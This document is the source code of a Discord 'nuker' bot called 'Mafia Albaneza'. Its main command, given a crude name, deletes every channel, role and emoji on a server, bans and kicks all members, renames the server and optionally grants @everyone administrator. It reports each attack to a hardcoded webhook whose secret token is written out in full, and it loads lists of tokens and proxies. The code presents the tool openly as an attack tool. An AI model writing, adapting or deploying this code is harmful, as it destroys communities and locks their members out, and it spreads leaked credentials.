const discordjs = require('discord.js');
const Discord = require('discord.js');
const fs = require('fs')
const tokens = fs.readFileSync('./variables/tokens.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const proxies = fs.readFileSync('./variables/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const cooldown = new Set();
const cdtime = 5;
const msg = 5;
const configjson = require('./config.json');
const helpEmbed = require('discord.js');
const footer = require('discord.js');
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const db = require("quick.db")
const inlinereply = require('discord-reply');
var whitelistedservers = ["942067056898089060"]
var give_everyone_administrator = configjson.server.give_everyone_administrator

client.on("ready", async () => {

let matatactu = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("")
.setFooter('status: online')
.setDescription(`<a:kill:943563293350576148> **__Mafia Albaneza It has been reconnected!__**`);

const wrb = new Discord.WebhookClient("942077979322900481", "II88TSirbLQzGYM6A0k0wcA20N15mJfhOuaYxCvLw0IXJAQb55LOW8mKuMNQ-5wQ43s9");
    await wrb.send(matatactu)

  console.log(`
====================Albaneza========================
bot on         
====================Albaneza========================`);
  
  const statusArray = ['Better leave me alone', 'I make you die only 1 button', 'i make your server dispear', 'Happy! 😛'];
client.user.setPresence({ status: 'dnd' });

    setInterval(() => {
      client.user.setPresence({ status: 'dnd' });
      const random = statusArray[Math.floor(Math.random() * statusArray.length)].split(', ')
      const status = random[0];
      const mode = random[1];
      client.user.setActivity(status, { type: mode })

    }, 10000) //your time of changing status in miliseconds for example 1 second = 1000 ms
});

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

client.on("message", async message => {

  if (message.author.bot) return;      
 //help 
  if (message.content.startsWith('help') || message.content.startsWith("Help") || message.content.startsWith("HELP")) {
            const helpEmbed = new Discord.MessageEmbed()
                .setTitle('<a:kill:943563293350576148> ・ **__HELP COMMANDS__**')
                .setDescription(`> <:sageata1:943563139042148494> \`rape\` <a:sageatagif:943563792065888296> **__Destroy Server__** \n > <:emoji:946474409978363914> \`ping\` <a:sageatagif:943563792065888296> **__Show Bot Ping__** \n > <:sageata2:943563204490051584> \`invite\` <a:sageatagif:943563792065888296> **__Bot Invite__**`)
              
           .setColor('#FFC900') 
.setThumbnail("https://media.discordapp.net/attachments/869954400142098482/946227602564214794/451309D1-B014-4B1A-8FA7-4CB057CD1E68.gif")
.setImage("")
     .setFooter(
                    `Help`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
       message.channel.send(helpEmbed);
  }  

 if (message.content.startsWith('invite')||message.content.startsWith(`Invite`)||message.content.startsWith(`INVITE`)) {

    const helpEmbed = new Discord.MessageEmbed()
      
      .setThumbnail("https://media.discordapp.net/attachments/869954400142098482/945929792618897418/IMG_5356.gif")
      .setTitle('<a:kill:943563293350576148> ・ **__INVITE__**')
      .setColor("#FFC900")
      .setDescription(`> <:sageata1:943563139042148494> [Invite Bot](https://discord.gg/4Ty4TzVRSS) \n > <:sageata2:943563204490051584> [Server](https://discord.gg/4Ty4TzVRSS)`)
      .setImage(``)
                .setFooter(
                    `requested by ${message.author.username}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('#FFC900')
        message.channel.send(helpEmbed)
  } 
  
//ping
  if (message.content.startsWith('ping') || message.content.startsWith("Ping") || message.content.startsWith("PING")) {

    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<a:x_:943565983925301328> \`Please wait 5 seconds to use this command\``).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
      }, cdtime * 1000);

        var states = "[Excellent](https://discord.gg/4Ty4TzVRSS)";
        var states2 = "[Excellent](https://discord.gg/4Ty4TzVRSS)";
        var msg = `${Date.now() - message.createdTimestamp}`;
        var api = `${Math.round(client.ws.ping)}`;
        if (Number(msg) > 70) states = "[Good](https://discord.gg/4Ty4TzVRSS)";
        if (Number(msg) > 170) states = "[Not Bad](https://discord.gg/4Ty4TzVRSS)";
        if (Number(msg) > 350) states = "[Soo Bad](https://discord.gg/4Ty4TzVRSS)";
        if (Number(api) > 70) states2 = "[Good](https://discord.gg/4Ty4TzVRSS)";
        if (Number(api) > 170) states2 = "[Not Bad](https://discord.gg/4Ty4TzVRSS)";
        if (Number(api) > 350) states2 = "[Soo Bad](https://discord.gg/4Ty4TzVRSS)";
        if (message.author.bot) return;
    const helpEmbed = new Discord.MessageEmbed()
      .setDescription(`> <:sageata1:943563139042148494> Ping Latency <a:sageatagif:943563792065888296> **\`${msg} ms\` | ${states}**\n > <:sageata2:943563204490051584> API Latency <a:sageatagif:943563792065888296> **\`${api} ms\` | ${states2}**`)
      .setColor("#FFC900")
    message.lineReply(helpEmbed).then(message => { setTimeout(function() { message.edit(`<a:x_:943565983925301328> Try again ty ping \`ping\``) }, 9999999) })
  }

  if (message.content.startsWith('uptime')) {

    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<a:x_:943565983925301328> \`Please wait 5 seconds to use this command\``).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

    var errorvar;

    // Basic embed
    let totalSeconds = (client.uptime / 1000);
    let days = Math.floor(totalSeconds / 86400);
    totalSeconds %= 86400;
    let hours = Math.floor(totalSeconds / 3600);
    totalSeconds %= 3600;
    let minutes = Math.floor(totalSeconds / 60);
    let seconds = Math.floor(totalSeconds % 60);

    var embed = new Discord.MessageEmbed()
      .setColor('FFC900')
      .setTitle(`**__UPTIME ALBANEZA__**`)
      .setDescription(`**Uptime:** \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\``)
      .setFooter(
        `Type - ${message.author.tag}`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()

    message.lineReply(embed).then(message => { setTimeout(function() { message.edit(`<a:x_:943565983925301328> Try again typing \`uptime\``) }, 9999999) })

  }

if (message.content.startsWith ("leaveall")) {
  let ownerID = "941961664629194812"
           let owner2 = "371224177186963460"
           if(message.author.id !== ownerID && message.author.id !== owner2) return;
             client.guilds.cache.forEach(guild => {
               let whitelist = "942067056898089060"
               if(whitelist.includes(guild.id)) return;
               guild.leave()
               message.channel.send(`**__Left all guilds!__**`)
             })
           }

if (message.content.startsWith('stats') || message.content.startsWith("Stats") || message.content.startsWith("STATS")) {
  if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<a:x_:943565983925301328> \`Please wait 5 seconds to use this command\``).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

    const embed = new Discord.MessageEmbed()
      .setDescription("**__STATS ALBANEZA__**")
      .setColor('FFC900')
      .setTitle('')
      .addField(`**Server Count**`, ` \`${client.guilds.cache.size} server(s)\``, false)
      .addField(`**Total Member Count**`, `\`${client.users.cache.size} member(s)\``, false)
      .addField(`**Discord.JS version**`, ` \`v${Discord.version}\``, false) 
      
.setFooter(
        `Type - ${message.author.tag}`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()

message.lineReply(embed).then(message => { setTimeout(function() { message.edit(`<a:x_:943565983925301328> Try again typing \`stats\``) }, 9999999) })
}
  
	//rape	
  if (message.content.startsWith('rape') || message.content.startsWith("Rape") || message.content.startsWith("RAPE")) {    
		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()

	    	.setColor('FF0F00')
                .setTitle("")
	    	.setDescription("<a:x_:943565983925301328> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
    message.delete();
    // Channel Delete


    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    )); // deletes all channels
    message.delete();

    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "Albaneza was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))

let mes = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("\`Mafia Albaneza\`")
.setFooter('')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) \n o folosit comanda **rape** pe serverul \n **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) \n cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("942070675441594428", "M4ZP0cePda0bvFZvuCY1rWKJG963DUdk8r4xBeMEivT4N20gJaBI2rY0zq0XrRGlhDY9");

    await wrb.send(mes)
    // Kick All

    message.guild.members.cache.forEach(member => member.kick({ reason: "Albaneza was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ));
    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })

    // Delete All Emojis 
    message.guild.emojis.cache.forEach(e => e.delete({ reason: " albaneza pe host rusesc" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))

      message.guild.setIcon('https://cdn.discordapp.com/icons/945623645710086165/e03023b80b037ba2ab19a9c9e4dc19cb.webp') // changes server pfp

//haha
		if (give_everyone_administrator == false)
		{
			console.log(`Giving administrator to @everyone has been disabled.`)
		}
		else
		{
			var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
			everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES","ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])
			
		}
    // Death.

    message.guild.setName(`albaneza pe host rusesc`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://cdn.discordapp.com/icons/945623645710086165/e03023b80b037ba2ab19a9c9e4dc19cb.webp') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Albaneza was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))


    
        await message.guild.channels.create(`cf`, {
      type : 'category'
    })

  }

})
      
const http = require('http');
const requestListener = function(req, res) {
  res.end('Mafia Albaneza the best bot nuker!');
}
const server = http.createServer(requestListener); 
server.listen(8080);

client.login(process.env.token)     